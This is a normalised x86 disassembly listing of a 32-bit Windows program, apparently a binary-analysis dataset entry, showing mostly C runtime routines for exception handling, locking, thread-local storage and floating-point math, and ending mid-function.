push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43f450
pop ecx
pop ebp
retn 0x4
j_sub_43f543
jmp sub_43f543
sub_43f65b
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_41a190
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov eax esi
pop esi
retn
sub_43f703
mov edi edi
push esi
push [ rw-data ]
mov esi ecx
push esi
call sub_43f677
lea ecx [ esi + 0x20 ]
pop esi
jmp sub_43f610
sub_43f7b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x0
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_43f960
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44120e
sub_43f97a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43f960
sub_43fa02
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_43fae6
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_43fa82
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_43fae6
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_43fb60
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_44120e
pop ecx
sub_43fb76
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_43fba4
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_443c1f
pop ecx
retn
sub_43fc52
push 0x8
mov eax sub_458dc3
call sub_443310
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_43fa1d
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_443346
retn
sub_43fc77
and [ ebp - 0x14 ] 0x0
mov eax r-xdata
retn
sub_43fc81
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43f960
pop ecx
pop ebp
retn
sub_43fd4d
push [ ebp + 0x8 ]
call sub_443e62
pop ecx
retn
sub_43fd57
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43fc91
add esp 0xc
pop ebp
retn
sub_43fec6
push [ ebp + 0x8 ]
call sub_443e62
pop ecx
retn
sub_4400d1
push [ ebp + 0x8 ]
call sub_443e62
pop ecx
retn
sub_440371
push [ ebp + 0x18 ]
call sub_443e62
pop ecx
retn
sub_44037b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4402e5
add esp 0x14
pop ebp
retn
sub_440483
push esi
call sub_443e62
pop ecx
retn
sub_4404c8
push 0xc
push r--data
call sub_4433dc
call sub_445601
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_44048b
sub_4404fd
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_445d53
int3
sub_44065a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4407b7
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440791
add esp 0x14
retn
sub_440cb9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_440ca3
sub_440cc4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43fc52
sub_4410fd
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4416d6
add esp 0xc
pop ebp
retn
sub_441113
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4410fd
sub_44111e
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_44870f
add esp 0xc
pop ebp
retn
sub_441264
push 0x4
call sub_44880c
pop ecx
retn
sub_4413bd
call sub_445b42
retn
sub_4413c3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_441387
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_441a59
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4419ce
add esp 0x14
pop ebp
retn
sub_441acd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_446222
call sub_441a76
add esp 0x10
pop ebp
retn
sub_441c34
push 0x4
call sub_44880c
pop ecx
retn
sub_441db5
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441dcd
sub_441df0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_44b0de
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_441e76
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441dcd
sub_4425da
push [ ebp + 0x8 ]
call sub_443e62
pop ecx
retn
sub_442b42
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_445dd6
pop ecx
pop ecx
retn
sub_442b7c
xor eax eax
inc eax
retn
sub_442b80
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
call sub_443421
retn
sub_442b95
call sub_44ddaa
jmp sub_442a18
sub_443346
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_443421
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4435cc
mov eax sub_44f71a
mov [ rw-data ] eax
mov [ rw-data ] sub_44ee01
mov [ rw-data ] sub_44edb5
mov [ rw-data ] sub_44edee
mov [ rw-data ] sub_44ed57
mov [ rw-data ] eax
mov [ rw-data ] sub_44f692
mov [ rw-data ] sub_44ed73
mov [ rw-data ] sub_44ecd5
mov [ rw-data ] sub_44ec62
retn
sub_44362c
mov edi edi
push ebp
mov ebp esp
call sub_4435cc
call sub_44f7c7
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_44f75e
sub_443666
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_44f7f0
sub_443b80
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_443c86
push 0xe
call sub_44880c
pop ecx
retn
sub_443dcf
call sub_44471c
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_44120e
pop ecx
retn
call sub_44f81b
sub_4442b0
push 0x1
call sub_44880c
pop ecx
retn
sub_444392
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_4442bc
add esp 0xc
pop ebp
retn 0x4
sub_4443c5
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_450281
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_4443f8
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_4442bc
add esp 0xc
pop ebp
retn 0x8
sub_444556
push [ ebp + 0x8 ]
call sub_4504c1
pop ecx
retn
sub_4446e4
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_443e9e
pop ecx
pop ecx
retn
sub_444713
push 0x1
call sub_44880c
pop ecx
retn
sub_44471c
push 0x1
call sub_444642
pop ecx
retn
sub_444962
xor eax eax
inc eax
retn
sub_445159
push [ ebp + 0x8 ]
call sub_4504c1
pop ecx
retn
sub_4452c2
push [ ebp + 0x8 ]
call sub_4504c1
pop ecx
retn
sub_4453ea
call [ TlsAlloc@IAT ]
retn 0x4
sub_4453f3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_44540d
mov eax [ rw-data ]
retn
sub_445447
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_445378
pop ecx
call eax
pop ebp
retn 0x8
sub_445576
push 0xd
call sub_44880c
pop ecx
retn
sub_44557f
push 0xc
call sub_44880c
pop ecx
retn
sub_445735
push 0xd
call sub_44880c
pop ecx
retn
sub_445741
push 0xc
call sub_44880c
pop ecx
retn
sub_445a6b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_445b21
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_445af6
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_445b39
push 0x8
call sub_4488e6
pop ecx
retn
sub_445b42
push 0x8
call sub_44880c
pop ecx
retn
sub_445d28
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_44880c
pop ecx
sub_445d3d
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_445c11
add esp 0xc
pop ebp
retn
sub_445d53
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_445c11
add esp 0xc
pop ebp
retn
sub_445d69
push 0x1
push 0x0
push 0x0
call sub_445c11
add esp 0xc
retn
sub_445d78
push 0x1
push 0x1
push 0x0
call sub_445c11
add esp 0xc
retn
sub_445dd5
retn
sub_446dba
and [ rw-data ] 0x0
retn
sub_447396
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4472e1
pop ecx
pop ecx
pop ebp
retn
sub_4476b8
mov edi edi
push ebp
mov ebp esp
call sub_447f3b
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4476c9
mov edi edi
push ebp
mov ebp esp
call sub_447f41
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4476da
mov edi edi
push ebp
mov ebp esp
call sub_447f47
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_447997
push 0x7
call sub_44880c
pop ecx
retn
sub_447e46
push 0x6
call sub_44880c
pop ecx
retn
sub_447e87
push 0x6
call sub_44880c
pop ecx
retn
sub_447f3b
mov eax rw-data
retn
sub_447f41
mov eax rw-data
retn
sub_447f47
mov eax rw-data
retn
sub_447f4d
mov eax rw-data
retn
sub_448372
and [ rw-data ] 0x0
call sub_451f58
mov [ rw-data ] eax
xor eax eax
retn
sub_44880c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4488dd
push 0xa
call sub_44880c
pop ecx
retn
sub_449477
push 0x4
call sub_44880c
pop ecx
retn
sub_4495c4
push 0x4
call sub_44880c
pop ecx
retn
sub_44995c
push 0xd
call sub_44880c
pop ecx
retn
sub_449d27
push 0xd
call sub_44880c
pop ecx
retn
sub_449d60
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_449bc6
pop ecx
mov [ rw-data ] 0x1
sub_44a097
push 0xc
call sub_44880c
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_44b0de
push 0x8
push r--data
call sub_4433dc
call sub_445601
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_44b173
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_44b0fe
xor eax eax
inc eax
retn
sub_44b117
call sub_445601
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_44b0de
call eax
sub_44b14e
xor eax eax
inc eax
retn
sub_44b162
push sub_44b0de
call sub_4452fd
pop ecx
mov [ rw-data ] eax
retn
sub_44b2ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_44cc12
cld
retn
sub_44cc14
inc esp
add bl bh
rol [ eax + eax + 0x2d ] 0xc2
inc esp
add [ ecx - 0x2affbb3e ] cl
retn 0x44
sub_44d97b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_44d943
pop ecx
pop ecx
pop ebp
retn
sub_44d9d0
push sub_44d98e
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
sub_44de92
mov [ ecx ] r--data
jmp sub_43fb60
sub_44dfee
push [ ebp - 0x14 ]
call sub_44df23
pop ecx
retn
sub_44e032
call sub_445601
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_445601
add eax 0x90
dec [ eax ]
sub_44e0d5
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_44e0de
mov esp [ ebp - 0x18 ]
call sub_44b0de
sub_44e18b
push 0x4
mov eax sub_458dde
call sub_443310
call sub_445601
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_44b117
call sub_44b12a
sub_44e264
mov eax [ ebp - 0x14 ]
call sub_44e04d
retn
sub_44e4db
xor eax eax
inc eax
retn
sub_44e4df
mov esp [ ebp - 0x18 ]
call sub_44b0de
sub_44e574
xor eax eax
inc eax
retn
sub_44e578
mov esp [ ebp - 0x18 ]
call sub_44b0de
sub_44ea2a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_43fb03
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_44edb5
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44ed73
add esp 0x10
pop ebp
retn
sub_44edee
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_44ec62
pop ecx
pop ecx
pop ebp
retn
sub_44ee01
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_44ecd5
pop ecx
pop ecx
pop ebp
retn
sub_44f8b1
push 0x1
call sub_44880c
pop ecx
retn
sub_4500fd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_45012d
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_450144
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_443421
retn
push 0x8
call [ SetLastError@IAT ]
sub_450255
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_45018c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4502a0
call eax
retn
sub_4504b8
push 0xa
call sub_44880c
pop ecx
retn
sub_4505bb
push 0xa
call sub_44880c
pop ecx
retn
sub_450679
push 0xb
call sub_44880c
pop ecx
retn
sub_450e87
push [ ebp + 0x8 ]
call sub_4504c1
pop ecx
retn
sub_450f68
push [ ebp + 0x8 ]
call sub_4504c1
pop ecx
retn
sub_451150
push [ ebp + 0x8 ]
call sub_4504c1
pop ecx
retn
sub_45115a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_4511af
push [ rw-data ]
call sub_445378
pop ecx
retn
sub_451330
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_44880c
pop ecx
sub_45136c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_451477
push 0x4
call sub_44880c
pop ecx
retn
sub_451684
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_4517b1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_45169a
add esp 0x10
pop ebp
retn
sub_4519f1
push 0x7
call sub_44880c
pop ecx
retn
sub_451edf
call sub_445601
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_44a02d
sub_451f05
xor eax eax
retn
sub_451f08
push 0xc
push r--data
call sub_4433dc
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_443421
retn
sub_451f25
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_451fba
call sub_451f58
mov [ rw-data ] eax
xor eax eax
retn
sub_452820
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_452830
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_4528ef
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_4531fe
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_453092
add esp 0x14
pop ebp
retn
sub_4540dd
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_45457f
push 0x2
call sub_445acd
pop ecx
retn
sub_454bff
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_454b11
add esp 0x10
pop ebp
retn
sub_455b03
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_456482
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4563c6
add esp 0xc
pop ebp
retn
VerQueryValueW
jmp [ VerQueryValueW@IAT ]
GetFileVersionInfoW
jmp [ GetFileVersionInfoW@IAT ]
GetFileVersionInfoSizeW
jmp [ GetFileVersionInfoSizeW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_456680
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_456561
add esp 0xc
pop ebp
retn
sub_456745
mov esp ebp
pop ebp
retn
sub_456750
push 0xc
push r--data
call sub_4433dc
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x1c ] 0x1
jmp sub_456789
sub_45676e
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
sub_456789
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_443421
retn 0x4
sub_4567a0
cmp [ rw-data ] 0x0
je sub_4567d6
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_456b60
push ebp
mov ebp esp
sub esp 0x10
and esp 0xfffffff0
fxch st1
fstp [ esp ]
fstp [ esp + 0x8 ]
call sub_456b79
leave
retn
j_sub_4579db#2
jmp sub_4579db
sub_457738
fstp st0
fstp st0
fld [ rw-data ]
mov [ ebp - 0x90 ] 0x2
retn
sub_457764
mov [ ebp - 0x90 ] 0x2
fstp st0
fld [ rw-data ]
retn
sub_457774
or cl cl
jne r-xdata
jmp r-xdata
retn
fstp st0
fld [ rw-data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_457779
fldlg2
jmp r-xdata
fxch st1
or cl cl
jne r-xdata
jmp sub_457a76
fyl2x
retn
sub_45777d
fldln2
fxch st1
or cl cl
jne r-xdata
jmp sub_457a76
fyl2x
retn
j_sub_4579db
jmp sub_4579db
sub_4577c9
fstp st0
jmp r-xdata
fstp st0
fld [ rw-data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_4577ff
fstp st0
fstp st0
fld [ rw-data ]
mov [ ebp - 0x90 ] 0x3
retn
sub_457811
or cl cl
jne r-xdata
jmp sub_4579d6
fstp st0
fld [ rw-data ]
retn
sub_4579c8
fxch st1
fstp st0
retn
sub_4579d6
fstp st0
fldz
retn
sub_4579db
fstp st0
fstp st0
fld1
retn
sub_4579e2
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fadd [ rw-data ]
retn
mov [ ebp - 0x90 ] 0x7
retn
sub_457a0d
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x90 ] 0x7
jmp r-xdata
faddp st1
retn
sub_457a76
fstp st0
fstp st0
fld [ rw-data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_457a89
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_457a93
or cl cl
je r-xdata
retn
fchs
sub_457b00
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_457b15
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_457b2c
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x1
retn
mov eax 0x7
retn
sub_457b88
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_457f57
sub esp 0x2c
and eax 0x3f
jmp [ eax * 4 + rw-data ]
sub_457f6a
add esp 0x2c
int 0x6
fdivr st0
add esp 0x2c
retn
sub_457f75
add esp 0x2c
int 0x6
fdiv st0
add esp 0x2c
retn
sub_457f80
fdivp st0
add esp 0x2c
retn
sub_457f86
fdivr st0
add esp 0x2c
retn
sub_457f8c
fdivrp st0
add esp 0x2c
retn
sub_457f92
fstp [ esp + 0xc ]
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fld [ esp + 0x20 ]
fxch st1
add esp 0x2c
retn
sub_457fae
add esp 0x2c
int 0x6
fstp [ esp ]
fstp [ esp + 0xc ]
call sub_457e40
fld [ esp + 0xc ]
fxch st1
add esp 0x2c
retn
sub_457fc9
add esp 0x2c
int 0x6
fxch st1
fstp [ esp + 0xc ]
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_457fea
fstp [ esp ]
fstp [ esp + 0xc ]
call sub_457e40
add esp 0x2c
retn
sub_457ffa
fstp [ esp + 0xc ]
fstp [ esp ]
call sub_457e40
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_45800e
fstp [ esp + 0xc ]
fstp [ esp ]
call sub_457e40
add esp 0x2c
retn
sub_45801e
fstp [ esp + 0xc ]
fxch st1
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st1
fld [ esp + 0x20 ]
fxch st2
add esp 0x2c
retn
sub_45803e
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st1
fstp [ esp + 0xc ]
call sub_457e40
fxch st1
fld [ esp + 0xc ]
fxch st2
add esp 0x2c
retn
sub_458082
fstp [ esp ]
fxch st1
fstp [ esp + 0xc ]
call sub_457e40
fxch st1
add esp 0x2c
retn
sub_458096
fstp [ esp + 0xc ]
fxch st1
fstp [ esp ]
call sub_457e40
fxch st1
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_4580ae
fstp [ esp + 0xc ]
fxch st1
fstp [ esp ]
call sub_457e40
fxch st1
add esp 0x2c
retn
sub_4580c2
fstp [ esp + 0xc ]
fxch st2
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st2
fld [ esp + 0x20 ]
fxch st3
add esp 0x2c
retn
sub_4580e2
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st2
fstp [ esp + 0xc ]
call sub_457e40
fxch st2
fld [ esp + 0xc ]
fxch st3
add esp 0x2c
retn
sub_458126
fstp [ esp ]
fxch st2
fstp [ esp + 0xc ]
call sub_457e40
fxch st2
add esp 0x2c
retn
sub_45813a
fstp [ esp + 0xc ]
fxch st2
fstp [ esp ]
call sub_457e40
fxch st2
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_458152
fstp [ esp + 0xc ]
fxch st2
fstp [ esp ]
call sub_457e40
fxch st2
add esp 0x2c
retn
sub_458166
fstp [ esp + 0xc ]
fxch st3
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st3
fld [ esp + 0x20 ]
fxch st4
add esp 0x2c
retn
sub_458186
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st3
fstp [ esp + 0xc ]
call sub_457e40
fxch st3
fld [ esp + 0xc ]
fxch st4
add esp 0x2c
retn
sub_4581ca
fstp [ esp ]
fxch st3
fstp [ esp + 0xc ]
call sub_457e40
fxch st3
add esp 0x2c
retn
sub_4581de
fstp [ esp + 0xc ]
fxch st3
fstp [ esp ]
call sub_457e40
fxch st3
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_4581f6
fstp [ esp + 0xc ]
fxch st3
fstp [ esp ]
call sub_457e40
fxch st3
add esp 0x2c
retn
sub_45820a
fstp [ esp + 0xc ]
fxch st4
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st4
fld [ esp + 0x20 ]
fxch st5
add esp 0x2c
retn
sub_45822a
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st4
fstp [ esp + 0xc ]
call sub_457e40
fxch st4
fld [ esp + 0xc ]
fxch st5
add esp 0x2c
retn
sub_45826e
fstp [ esp ]
fxch st4
fstp [ esp + 0xc ]
call sub_457e40
fxch st4
add esp 0x2c
retn
sub_458282
fstp [ esp + 0xc ]
fxch st4
fstp [ esp ]
call sub_457e40
fxch st4
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_45829a
fstp [ esp + 0xc ]
fxch st4
fstp [ esp ]
call sub_457e40
fxch st4
add esp 0x2c
retn
sub_4582ae
fstp [ esp + 0xc ]
fxch st5
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st5
fld [ esp + 0x20 ]
fxch st6
add esp 0x2c
retn
sub_4582ce
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st5
fstp [ esp + 0xc ]
call sub_457e40
fxch st5
fld [ esp + 0xc ]
fxch st6
add esp 0x2c
retn
sub_458312
fstp [ esp ]
fxch st5
fstp [ esp + 0xc ]
call sub_457e40
fxch st5
add esp 0x2c
retn
sub_458326
fstp [ esp + 0xc ]
fxch st5
fstp [ esp ]
call sub_457e40
fxch st5
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_45833e
fstp [ esp + 0xc ]
fxch st5
fstp [ esp ]
call sub_457e40
fxch st5
add esp 0x2c
retn
sub_458352
fstp [ esp + 0xc ]
fxch st6
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st6
fld [ esp + 0x20 ]
fxch st7
add esp 0x2c
retn
sub_458372
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st6
fstp [ esp + 0xc ]
call sub_457e40
fxch st6
fld [ esp + 0xc ]
fxch st7
add esp 0x2c
retn
sub_4583b6
fstp [ esp ]
